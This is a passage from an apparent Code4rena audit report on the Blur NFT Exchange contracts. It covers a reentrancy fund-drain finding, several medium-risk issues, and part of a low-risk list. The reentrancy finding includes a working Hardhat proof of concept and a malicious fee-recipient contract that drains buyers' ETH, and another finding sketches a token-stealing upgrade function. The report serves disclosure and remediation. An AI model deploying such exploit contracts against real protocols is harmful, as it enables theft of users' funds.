remainingETH = 0;\n        isInternal = false;\n    }\n```\n\n`_execute` will be called to handle the buy and sell order.\n* The function has a reentracnyGuard. \n* The function will check that the orders are signed correctly and that both orders match.\n* If everything is OK, `_executeFundsTransfer` will be called to transfer the buyers funds to the seller and fee recipient\n\n`_executeFundsTransfer`:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565\n```\n    function _executeFundsTransfer(\n        address seller,\n        address buyer,\n        address paymentToken,\n        Fee[] calldata fees,\n        uint256 price\n    ) internal {\n        if (msg.sender == buyer && paymentToken == address(0)) {\n            require(remainingETH >= price);\n            remainingETH -= price;\n        }\n\n        /* Take fee. */\n        uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);\n\n        /* Transfer remainder to seller. */\n        _transferTo(paymentToken, buyer, seller, receiveAmount);\n    }\n```\n\nFees are calculated based on the rate set by the seller and send to the fee recipient in `_transferFees`. \n\nWhen the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract. \nThis can be done through `bulkExecution`.\n\n`bulkExecution` can be called with an empty array. If so, no `_execute` function will be called and therefore no reentrancyGuard will trigger.\nAt the end of `bulkExecution`, `_returnDust` function is called to return excessive funds.\n\n`bulkExecute`: \nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\n```\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n        /*\n        REFERENCE\n        uint256 executionsLength = executions.length;\n        for (uint8 i=0; i < executionsLength; i++) {\n            bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);\n            (bool success,) = address(this).delegatecall(data);\n        }\n        _returnDust(remainingETH);\n        */\n        uint256 executionsLength = executions.length;\n        for (uint8 i = 0; i < executionsLength; i++) {\n```\n\n`_returnDust`:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212\n```\n    function _returnDust() private {\n        uint256 _remainingETH = remainingETH;\n        assembly {\n            if gt(_remainingETH, 0) {\n                let callStatus := call(\n                    gas(),\n                    caller(),\n                    selfbalance(),\n                    0,\n                    0,\n                    0,\n                    0\n                )\n            }\n        }\n    }\n```\n\nAfter the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the `_executeFundsTransfer` to not revert and be able to send funds (0.9 ETH) to the seller. This can be done using the `selfdestruct` opcode\n\nAfter that, the `_execute` function will continue and exit normally.<br>\n`bulkExecute` will continue to the next order and call `_execute` which will revert.<br>\nBecause `bulkExecute` delegatecalls `_execute` and continues even after revert, the function `bulkExecute` will complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.\n\n### Hardhat Proof of Concept\n\nAdd the following test to `execution.test.ts`:\n```\ndescribe.only('hack', async () => {\n      let executions: any[];\n      let value: BigNumber;\n      beforeEach(async () => {\n        await updateBalances();\n        const _executions = [];\n        value = BigNumber.from(0);\n        // deploy MockFeeReceipient\n        let contractFactory = await (hre as any).ethers.getContractFactory(\n          \"MockFeeReceipient\",\n          {},\n        );\n        let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);\n        await contractMockFeeReceipient.deployed();\n        //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut\n        tokenId += 1;\n        await mockERC721.mint(alice.address, tokenId);\n        sell = generateOrder(alice, {\n          side: Side.Sell,\n          tokenId,\n          paymentToken: ZERO_ADDRESS,\n          fees: [ \n            {\n              rate: 1000,\n              recipient: contractMockFeeReceipient.address,\n            }\n          ],\n        });\n        buy = generateOrder(bob, { \n          side: Side.Buy,\n          tokenId,\n          paymentToken: ZERO_ADDRESS});\n        _executions.push({\n            sell: await sell.packNoOracleSig(),\n            buy: await buy.packNoSigs(),\n        });\n        // create 3 more executions\n        tokenId += 1;\n        for (let i = tokenId; i < tokenId + 3; i++) {\n          await mockERC721.mint(thirdParty.address, i);\n          const _sell = generateOrder(thirdParty, {\n            side: Side.Sell,\n            tokenId: i,\n            paymentToken: ZERO_ADDRESS,\n          });\n          const _buy = generateOrder(bob, {\n            side: Side.Buy,\n            tokenId: i,\n            paymentToken: ZERO_ADDRESS,\n          });\n          _executions.push({\n            sell: await _sell.packNoOracleSig(),\n            buy: await _buy.packNoSigs(),\n          });\n        }\n        executions = _executions;\n      });\n      it(\"steal funds\", async () => {\n        let aliceBalanceBefore = await alice.getBalance();\n        //price = 4 ETH\n        value = price.mul(4);\n        //call bulkExecute\n        tx = await waitForTx(\n          exchange.connect(bob).bulkExecute(executions, { value  }));\n        let aliceBalanceAfter = await alice.getBalance();\n        let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);\n        //check that alice received all 4 ETH\n        expect(aliceEarned).to.equal(value);\n      });\n    });\n```\n\nAdd the following contract to mocks folder:<br>\n`MockFeeRecipient.sol`:\n```\npragma solidity 0.8.17;\n\nimport { Exchange } from \"../Exchange.sol\";\nimport { Execution } from \"../lib/OrderStructs.sol\";\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n\n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[](0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n\n            // Now we received All of buyers funds. \n            // Send stolen ETH to seller minus the amount needed in order to keep execution.\n            address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');\n\n            // selfdestruct and send funds needed to Exchange (to not revert)\n            selfdestruct(payable(msg.sender));\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n\n```\n\nExecute `yarn test` to see that test pass (Alice stole all 4 ETH)\n\n### Tools Used\nVS code, hardhat\n\n### Recommended Mitigation Steps\n1. Put a reentrancyGuard on `execute` and `bulkExecute` functions\n2. `_refundDust` return only _remainingETH\n3. revert in `bulkExecute` if parameter array is empty.\n\n**[nonfungible47 (Blur) confirmed and commented](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96#issuecomment-1341617796):**\n > Both mitigation steps 2 and 3 were added. We cannot add `reentrancyGuard` to the `execute` and `bulkExecute` functions as it will break the call to `_execute`. So, a separate guard was added in `setupExecution` that would require `isInternal = false`, preventing reentrant calls.\n\n\n\n***\n \n# Medium Risk Findings (2)\n## [[M-01] Yul `call` return value not checked](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/90)\n*Submitted by rotcivegaf, also found by 0x4non, 0xDecorativePineapple, 9svR6w, adriro, ajtra, aviggiano, brgltd, carlitox477, chaduke, codexploder, corerouter, joestakey, ladboy233, s3cunda, saian, Trust, V\\_B, and wait*\n\n[Exchange.sol#L212-L227](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212-L227)<br>\n\nThe Yul `call` return value on function `_returnDust` is not checked, which could leads to the `sender` lose funds\n\n### Proof of Concept\n\nThe caller of the functions `bulkExecute` and `execute` could be a contract who may not implement the `fallback` or `receive` functions or reject the `call`, when a call to it with value sent in the function `_returnDust`, it will revert, thus it would fail to receive the `dust` ether\n\nProof: \n - A contract use `bulkExecute`\n - One of the executions fails\n - The `Exchange` contract send the `dust`(Exchange balance) back to the contract \n - This one for any reason reject the call\n - The `dust` stay in the `Exchange` contract\n - In the next call of `bulkExecute` or `execute` the balance of the `Exchange` contract(including the old `dust`) will send to the new caller\n - The second sender will get the funds of the first contract\n\n### Recommended Mitigation Steps\n\n```diff\n+    error ReturnDustFail();\n+\n\t\t function _returnDust() private {\n\t\t\t\t uint256 _remainingETH = remainingETH;\n+        bool success;\n\t\t\t\t assembly {\n\t\t\t\t\t\t if gt(_remainingETH, 0) {\n-                let callStatus := call(\n+                success := call(\n\t\t\t\t\t\t\t\t\t\t gas(),\n\t\t\t\t\t\t\t\t\t\t caller(),\n\t\t\t\t\t\t\t\t\t\t selfbalance(),\n\t\t\t\t\t\t\t\t\t\t 0,\n\t\t\t\t\t\t\t\t\t\t 0,\n\t\t\t\t\t\t\t\t\t\t 0,\n\t\t\t\t\t\t\t\t\t\t 0\n\t\t\t\t\t\t\t\t )\n\t\t\t\t\t\t }\n\t\t\t\t }\n+        if (!success) revert ReturnDustFail();\n\t\t }\n```\n\n**[nonfungible47 (Blur) confirmed and commented](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/90#issuecomment-1341618491):**\n > Mitigation to check call status and revert if unsuccessful was implemented.\n\n\n\n***\n\n## [[M-02] Hacked owner or malicious owner can immediately steal all assets on the platform](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179)\n*Submitted by Trust, also found by 0xhacksmithh, 0xSmartContract, 9svR6w, deliriusz, Josiah, ladboy233, and zaskoh*\n\n[Exchange.sol#L639](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L639)<br>\n[Exchange.sol#L30](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L30)<br>\n\nIn Non-Fungible's security model, users approve their ERC20 / ERC721 / ERC1155 tokens to the ExecutionDelegate contract, which accepts transfer requests from Exchange. \n\nThe requests are made here:\n```\nfunction _transferTo(\n    address paymentToken,\n    address from,\n    address to,\n    uint256 amount\n) internal {\n    if (amount == 0) {\n        return;\n    }\n    if (paymentToken == address(0)) {\n        /* Transfer funds in ETH. */\n        require(to != address(0), \"Transfer to zero address\");\n        (bool success,) = payable(to).call{value: amount}(\"\");\n        require(success, \"ETH transfer failed\");\n    } else if (paymentToken == POOL) {\n        /* Transfer Pool funds. */\n        bool success = IPool(POOL).transferFrom(from, to, amount);\n        require(success, \"Pool transfer failed\");\n    } else if (paymentToken == WETH) {\n        /* Transfer funds in WETH. */\n        executionDelegate.transferERC20(WETH, from, to, amount);\n    } else {\n        revert(\"Invalid payment token\");\n    }\n}\n```\n\n```\nfunction _executeTokenTransfer(\n    address collection,\n    address from,\n    address to,\n    uint256 tokenId,\n    uint256 amount,\n    AssetType assetType\n) internal {\n    /* Call execution delegate. */\n    if (assetType == AssetType.ERC721) {\n        executionDelegate.transferERC721(collection, from, to, tokenId);\n    } else if (assetType == AssetType.ERC1155) {\n        executionDelegate.transferERC1155(collection, from, to, tokenId, amount);\n    }\n}\n```\n\nThe issue is that there is a significant centralization risk trusting Exchange.sol contract to behave well, because it is an immediately upgradeable ERC1967Proxy. All it takes for a malicious owner or hacked owner to upgrade to the following contract:\n\n```\nfunction _stealTokens(\n    address token,\n    address from,\n    address to,\n    uint256 tokenId,\n    uint256 amount,\n    AssetType assetType\n) external onlyOwner {\n    /* Call execution delegate. */\n    if (assetType == AssetType.ERC721) {\n        executionDelegate.transferERC721(token, from, to, tokenId);\n    } else if (assetType == AssetType.ERC1155) {\n        executionDelegate.transferERC1155(token, from, to, tokenId, amount);\n    } else if (assetType == AssetType.ERC20) {\n        executionDelegate.transferERC20(token, from, to, amount);\n}\n```\n\nAt this point hacker or owner can steal all the assets approved to Non-Fungible. \n\n### Impact\n\nHacked owner or malicious owner can immediately steal all assets on the platform.\n\n### Recommended Mitigation Steps\n\nExchange contract proxy should implement a timelock, to give users enough time to withdraw their approvals before some malicious action becomes possible.\n\n### Judging Note from Warden\n\nThe status quo regarding significant centralization vectors has always been to award Medium severity, in order to warn users of the protocol of this category of risks. See [here](https://gist.github.com/GalloDaSballo/881e7a45ac14481519fb88f34fdb8837) for list of centralization issues previously judged.\n\n**[berndartmuller (judge) commented](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179#issuecomment-1318420859):**\n > Using this submission as the primary issue for centralization risks.\n\n**[nonfungible47 (Blur) acknowledged](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/179#issuecomment-1324222401)**\n\n\n\n***\n\n## [[M-03] All orders which use `expirationTime == 0` to support oracle cancellation are not executable](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/181)\n*Submitted by Trust, also found by cccz*\n\n[Exchange.sol#L378](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L378)<br>\n\nThe Blur Exchange supplied docs state:<br>\n\n**Off-chain methods**<br>\n\"Oracle cancellations - if the order is signed with an expirationTime of 0, a user can request an oracle to stop producing authorization signatures; without a recent signature, the order will not be able to be matched\"\n\nFrom the docs, we can expect that when expirationTime is 0 , trader wishes to enable dynamic oracle cancellations. However, the recent code refactoring broke not only this functionality but all orders with expirationTime = 0.\n\nPrevious \\_validateOrderParameters:\n```\nfunction _validateOrderParameters(Order calldata order, bytes32 orderHash)\n\t\tinternal\n\t\tview\n\t\treturns (bool)\n{\n\t\treturn (\n\t\t\t\t/* Order must have a trader. */\n\t\t\t\t(order.trader != address(0)) &&\n\t\t\t\t/* Order must not be cancelled or filled. */\n\t\t\t\t(cancelledOrFilled[orderHash] == false) &&\n\t\t\t\t/* Order must be settleable. */\n\t\t\t\t_canSettleOrder(order.listingTime, order.expirationTime)\n\t\t);\n}\n/**\n * @dev Check if the order can be settled at the current timestamp\n * @param listingTime order listing time\n * @param expirationTime order expiration time\n */\nfunction _canSettleOrder(uint256 listingTime, uint256 expirationTime)\n\t\tview\n\t\tinternal\n\t\treturns (bool)\n{\n\t\treturn (listingTime < block.timestamp) && (expirationTime == 0 || block.timestamp < expirationTime);\n```\n\nNew \\_validateOrderParameters:\n```\nfunction _validateOrderParameters(Order calldata order, bytes32 orderHash)\n\t\tinternal\n\t\tview\n\t\treturns (bool)\n{\n\t\treturn (\n\t\t\t\t/* Order must have a trader. */\n\t\t\t\t(order.trader != address(0)) &&\n\t\t\t\t/* Order must not be cancelled or filled. */\n\t\t\t\t(!cancelledOrFilled[orderHash]) &&\n\t\t\t\t/* Order must be settleable. */\n\t\t\t\t(order.listingTime < block.timestamp) &&\n\t\t\t\t(block.timestamp < order.expirationTime)\n\t\t);\n}\n```\n\nNote the requirements on expirationTime in \\_canSettleOrder (old) and \\_validateOrderParameters (new).<br>\nIf `expirationTime == 0`, the condition was satisfied without looking at `block.timestamp < expirationTime`.<br>\nIn the new code, `block.timestamp < expirationTime` is *always* required in order for the order to be valid. Clearly, `block.timestamp < 0` will always be false, so all orders that wish to make use of off-chain cancellation will never execute.\n\n### Impact\n\nAll orders which use `expirationTime == 0` to support oracle cancellation are not executable.\n\n### Tools Used\n\nManual audit, diffing tool\n\n### Recommended Mitigation Steps\n\nImplement the checks the same way as they were in the previous version of Exchange.\n\n**[nonfungible47 (Blur) acknowledged and commented](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/181#issuecomment-1324199484):**\n > This is correct, however, as the maintainers of the main orderbook, we can ensure that no current orders have been created with expirationTime of 0.\n\n\n\n***\n\n## [[M-04] Pool designed to be upgradeable but does not set owner, making it un-upgradeable](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/186)\n*Submitted by Trust, also found by 0xDecorativePineapple, adriro, bin2chen, fs0c, hihen, neko_nyaa, philogy, and wait*\n\nThe docs state:<br>\n\"*The pool allows user to predeposit ETH so that it can be used when a seller takes their bid. It uses an ERC1967 proxy pattern and only the exchange contract is permitted to make transfers.*\"\n\nPool is designed as an ERC1967 upgradeable proxy which handles balances of users in Not Fungible. Users may interact via deposit and withdraw with the pool, and use the funds in it to pay for orders in the Exchange.\n\nPool is declared like so:\n```\ncontract Pool is IPool, OwnableUpgradeable, UUPSUpgradeable {\n\tfunction _authorizeUpgrade(address) internal override onlyOwner {}\n\t...\n```\n\nImportantly, it has no constructor and no initializers. The issue is that when using upgradeable contracts, it is important to implement an initializer which will call the base contract's initializers in turn. See how this is done correctly in Exchange.sol:\n\n```\n/* Constructor (for ERC1967) */\nfunction initialize(\n\t\tIExecutionDelegate _executionDelegate,\n\t\tIPolicyManager _policyManager,\n\t\taddress _oracle,\n\t\tuint _blockRange\n) external initializer {\n\t\t__Ownable_init();\n\t\tisOpen = 1;\n\t\t...\n}\n```\n\nSince Pool skips the \\_\\_Ownable_init initialization call, this logic is skipped:\n```\nfunction __Ownable_init() internal onlyInitializing {\n\t\t__Ownable_init_unchained();\n}\nfunction __Ownable_init_unchained() internal onlyInitializing {\n\t\t_transferOwnership(_msgSender());\n}\n```\n\nTherefore, the contract owner stays zero initialized, and this means any use of onlyOwner will always revert.\n\nThe only use of onlyOwner in Pool is here:\n```\nfunction _authorizeUpgrade(address) internal override onlyOwner {}\n```\n\nThe impact is that when the upgrade mechanism will check caller is authorized, it will revert. Therefore, the contract is unexpectedly unupgradeable. Whenever the EXCHANGE or SWAP address, or some functionality needs to be changed, it would not be possible.\n\n### Impact\n\nThe Pool contract is designed to be upgradeable but is actually not upgradeable.\n\n### Proof of Concept\n\nIn the 'pool' test in execution.test.ts, add the following lines:\n```\nit('owner configured correctly', async () => {\n\texpect(await pool.owner()).to.be.equal(admin.address);\n});\n```\n\nIt shows that the pool after deployment has owner as 0x0000...00\n\n### Tools Used\n\nManual audit, hardhat\n\n### Recommended Mitigation Steps\n\nImplement an initializer for Pool similarly to the `Exchange.sol` contract.\n\n**[nonfungible47 (Blur) confirmed and commented](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/186#issuecomment-1341620874):**\n > `initialize` function was added to set the pool owner. The function is called when deploying the proxy. \n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 21 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/261) by **0xSmartContract** received the top score from the judge.\n\n*The following wardens also submitted reports: [[0xNazgul](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/242), [c3phas](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/221), [Aymen0909](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/219), [Josiah](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/209), [tnevler](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/196), [Tricko](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/168), [brgltd](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/164), [joestakey](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/163), [0x4non](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/161), [chrisdior4](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/142), [rotcivegaf](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/134), [HE1M](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/120), [neko_nyaa](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/93), [trustindistrust](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/78), [martin](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/76), [0xhacksmithh](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/74), [Rolezn](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/54), [RaymondFam](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/45), [ladboy233](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/40), and [IllIllI](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/39).*\n\n## Low Risk Issues List\n| Number |Issues Details|Context|\n|:--:|:-------|:--:|\n|[L-01]| Potential DOS in Contract Inheriting UUPSUpgradeable.sol | 1 |\n|[L-02]| initialize() function can be called by anybody | 1 |\n|[L-03]| The `whenOpen` modifier just pauses the `execute`  and `bulkExecute` function | 1 |\n|[L-04]|`_returnDust`  function create dirty bits | 1 |\n|[L-05]|Critical Address Changes Should Use Two-step Procedure | 3 |\n|[L-06]| Owner can renounce Ownership  | 8 |\n|[L-07]|Loss of precision due to rounding | 1 |\n|[L-08]| Require messages are too short and unclear | 7 |\n|[L-09]|Fee recipient may be address(0) | 1 |\n|[L-10]| Exchange.sol  `_execute` buy.order.side not validated | 1 |\n\nTotal 10 issues\n\n## Non-Critical Issues List\n| Number |Issues Details|Context|\n|:--:|:-------|:--:|\n| [N-01]|Not using the latest version of OpenZeppelin from dependencies |1|\n| [N-02] |No same value input control  |1|\n| [N-03] | `0 address` check | 1 |\n| [N-04] | Omissions in Events | 4 |\n| [N-05] | Add parameter to Event-Emit | 2|\n| [N-06] |Include ``return parameters`` in _NatSpec comments_  | All Contracts |\n| [N-07] |Solidity compiler optimizations can be problematic | 1 |\n| [N-08] |NatSpec is missing | 10 |\n| [N-09] |Signature Malleability of EVM's ecrecover() | 1 |\n| [N-10] | Lines are too long  | 2 |\n| [N-11] |Stop using v != 27 && v != 28 or v == 27 || v == 28 | 1 |\n| [N-12] |`Empty blocks` should be _removed_ or _Emit_ something | 2 |\n| [N-13] |Signature scheme does not support smart contracts  | 1 |\n\nTotal 13 issues\n\n## Suggestions\n| Number | Suggestion Details |\n|:--:|:-------|\n| [S-01] |Generate perfect code headers every time |\n\nTotal 1 suggestion\n\n## [L-01] Potential DOS in Contract Inheriting `UUPSUpgradeable.sol`\n\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/main/scripts/deploy.ts#L18\n\n\nThe scripts/ folder outlines a number of deployment scripts used by the team. Some of the contracts deployed utilise the ERC1967 upgradeable proxy standard. \n\nThis standard involves first deploying an implementation contract and later a proxy contract which uses the implementation contract as its logic. When users make calls to the proxy contract, the proxy contract will delegate call to the underlying implementation contract. \n\n`Exchange.sol` implement an `initialize()` function which aims to replace the role of the `constructor()` when deploying proxy contracts\n\n`Exchange.sol` inherits `UUPSUpgradeable.sol`. It is important that the contract is deployed and initialized in the same transaction to avoid any malicious frontrunning. `Exchange.sol` may potentially have `initialized` variable be false, and if this happens, the malicious attacker would take over the control.\n\nit would be worthwhile to ensure the proxy contract is deployed and initialized in the same transaction, or ensure the `initialize()` function is callable only by the deployer of the proxy contract. This could be set in the proxy contracts `constructor()`\n\n\n### Recommended Mitigation Steps\n\nAs a result, a malicious attacker could monitor the Ethereum blockchain for bytecode that matches the  contract and frontrun the initialize() transaction to gain ownership of the contract. This can be repeated as a Denial Of Service (DOS) type of attack, effectively preventing  contract deployment, leading to unrecoverable gas expenses.\n\nAdd a control that makes `initialize()` only call the Deployer Contract;\n\n```js\nif (msg.sender != DEPLOYER_ADDRESS) {\n\t\t\t\t\t\trevert NotDeployer();\n\t\t\t\t}\n```\n\n\nIn another solution; Using the LibRLP library, which makes it possible to pre-calculate Foundry's contract deploy addresses, and deploy simultaneously using the Atomic transaction feature of Foundry and EVM.\n\nhttps://twitter.com/transmissions11/status/1518507047943245824?s=20&t=-SgkBERLJqFRHn7392GrbA\n\n```js\npragma solidity >=0.8.0;\nimport \"forge-std/Script.sol\";\nimport {LibRLP} from \"../../test/utils/LibRLP.sol\";\n\nabstract contract DeployBase is Script {\n\n\t\tfunction run() external {\n\t\t\t\tvm.startBroadcast();\n\n\t\t\t\t// Precomputed contract addresses, based on contract deploy nonces.\n\t\t\t\t// tx.origin is the address who will actually broadcast the contract creations below.\n\t\t\t\taddress BlurExchangeAddewss = LibRLP.computeAddress(tx.origin, vm.getNonce(tx.origin) + 1);\n\t\t\t\taddress proxyaddress = LibRLP.computeAddress(tx.origin, vm.getNonce(tx.origin) );\n```\n## [L-02]  initialize() function can be called by anybody\n\n`initialize()` function can be called anybody when the contract is not initialized.\n\nMore importantly, if someone else runs this function, they will have full authority because of the `__Ownable_init()` function.\nAlso, there is no 0 address check in the address arguments of the initialize() function, which must be defined.\n\nHere is a definition of `initialize()` function.\n\n```solidity\n\ncontracts/Exchange.sol:\n\t111      /* Constructor (for ERC1967) */\n\t112:     function initialize(\n\t113:         IExecutionDelegate _executionDelegate,\n\t114:         IPolicyManager _policyManager,\n\t115:         address _oracle,\n\t116:         uint _blockRange\n\t117:     ) external initializer {\n\t118:         __Ownable_init();\n\t119:         isOpen = 1;\n\t120: \n\t121:         DOMAIN_SEPARATOR = _hashDomain(EIP712Domain({\n\t122:             name              : NAME,\n\t123:             version           : VERSION,\n\t124:             chainId           : block.chainid,\n\t125:             verifyingContract : address(this)\n\t126:         }));\n\t127: \n\t128:         executionDelegate = _executionDelegate;\n\t129:         policyManager = _policyManager;\n\t130:         oracle = _oracle;\n\t131:         blockRange = _blockRange;\n\t132:     }\n\n```\n\n### Recommended Mitigation Steps\n\nAdd a control that makes `initialize()` only call the Deployer Contract;\n\n```js\nif (msg.sender != DEPLOYER_ADDRESS) {\n\t\t\t\t\t\trevert NotDeployer();\n\t\t\t\t}\n```\n\n## [L-03] The `whenOpen` modifier just pauses the `execute`  and `bulkExecute` function\n\nThe `whenOpen` modifier prevents the function it is used from, and the modifier constructor starts with the value `1(true)` by default.<br>\nIf `0(false)` is set by Owner, the function it is used with becomes inoperable.\n\nThe purpose of the `whenOpen` modifier; Pausing the project or just blocking the use of certain functions?<br>\nThis part is not understood.\n\nBecause when this modifier is closed with close, the `execute` and `bulkExecute`  functions will not work, but all other functions will work, which will confuse users.\n\nApart from the confusion, it can also cause technical question marks.\n\n### Proof of Concept\n\n1- Alice makes transactions from the platform, transfers with execute, changes transaction nonces with `incrementNonce`\n\n2- Pause the project with `whenOpen` by `owner`\n\n3- But Owner can change `oracle address`  or `setBlockRang` \n\n4- With `Owner` whenOpen, it starts the project again at any time (ERC721 may be a suitable time for price manipulation)\n\n5- All of these situations can lead to a question mark for users\n\n### Recommended Mitigation Steps\n\n1- The purpose of the `whenOpen` modifier; Pausing the project or just blocking the use of certain functions? This part should be clarified and added to the documents.\n\n2- When the project is paused, it can be ensured that it is included in critical features such as address change (There is no need to pause for these changes anyway). These clear user question marks.\n\n## [L-04]  `_returnDust`  function create dirty bits\n\nThis explanation should be added in the NatSpec comments of this function that sends ether with call;\n\nNote that this code probably isn’t secure or a good use case for assembly because a lot of memory management and security checks are bypassed.\nUse with caution! Some functions in this contract knowingly create dirty bits at the destination of the free memory pointer.\n\n\n```solidity\n\n function _returnDust() private {\n\t\t\t\tuint256 _remainingETH = remainingETH;\n\t\t\t\tassembly {\n\t\t\t\t\t\tif gt(_remainingETH, 0) {\n\t\t\t\t\t\t\t\tlet callStatus := call(\n\t\t\t\t\t\t\t\t\t\tgas(),\n\t\t\t\t\t\t\t\t\t\tcaller(),\n\t\t\t\t\t\t\t\t\t\tselfbalance(),\n\t\t\t\t\t\t\t\t\t\t0,\n\t\t\t\t\t\t\t\t\t\t0,\n\t\t\t\t\t\t\t\t\t\t0,\n\t\t\t\t\t\t\t\t\t\t0\n\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t}\n\t\t\t\t}\n\t\t}\n\n```\n\n### Recommended Mitigation Steps\n\nAdd this comment to `_returnDust`  function;<br>\n`/// @dev Use with caution! Some functions in this contract knowingly create dirty bits at the destination of the free memory pointer. Note that this code probably isn’t secure or a good use case for assembly because a lot of memory management and security checks are bypassed.`\n\n## [L-05] Critical Address Changes Should Use Two-step Procedure\n\nThe critical procedures should be two step process.<br>\nSee similar findings in previous Code4rena contests for reference:<br>\nhttps://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure\n\n```solidity\n\n3 results - 1 files\n\ncontracts/Exchange.sol:\n\t322  \n\t323:     function setExecutionDelegate(IExecutionDelegate _executionDelegate)\n\t324          external\n\n\t331  \n\t332:     function setPolicyManager(IPolicyManager _policyManager)\n\t333          external\n\n\t340  \n\t341:     function setOracle(address _oracle)\n\t342          external\n```\n\n### Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n## [L-06] Owner can renounce Ownership\n\n[Exchange.sol#L6](https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L6)\n\n### Description\n\nTypically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.\n\nThe non-fungible Ownable used in this project contract implements `renounceOwnership` . This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\n\n`onlyOwner` functions;\n```js\n\n\ncontracts/Exchange.sol:\n\t 56:     function open() external onlyOwner {\n\n\t 60:     function close() external onlyOwner {\n\n\t 66:     function _authorizeUpgrade(address) internal override onlyOwner {}\n\n\t324      function setExecutionDelegate(IExecutionDelegate _executionDelegate) onlyOwner\n\n\t334:     function setPolicyManager(IPolicyManager _policyManager) onlyOwner\n\n\t342      function setOracle(address _oracle) onlyOwner\n\n\t352:     function setBlockRange(uint256 _blockRange)\n\ncontracts/Pool.sol:\n\t15:     function _authorizeUpgrade(address) internal override onlyOwner {}\n\n```\n\n### Recommended Mitigation Steps\n\nWe recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.\n\n## [L-07] Loss of precision due to rounding\n\n```solidity\ncontracts/Exchange.sol:\n\n\t599: uint256 fee = (price * fees[i].rate) / INVERSE_BASIS_POINT;\n\n```\n\n## [L-08] Require messages are too short and unclear\n\n### Context\n\n```solidity\n7 results - 2 files\n\ncontracts/Exchange.sol:\n\t\n\n\t240:         require(sell.order.side == Side.Sell);\n\t \n\t291:         require(msg.sender == order.trader);\n \n\t573:         require(remainingETH >= price);\n\t\n\ncontracts/Pool.sol:\n\n\n\t45:         require(_balances[msg.sender] >= amount);\n\t\n\t48:         require(success);\n\t\n\t71:         require(_balances[from] >= amount);\n\t72:         require(to != address(0));\n```\n\n\n### Description\n\nThe correct and clear error description explains to the user why the function reverts, but the error descriptions below in the project are not self-explanatory. These error descriptions are very important in the debug features of 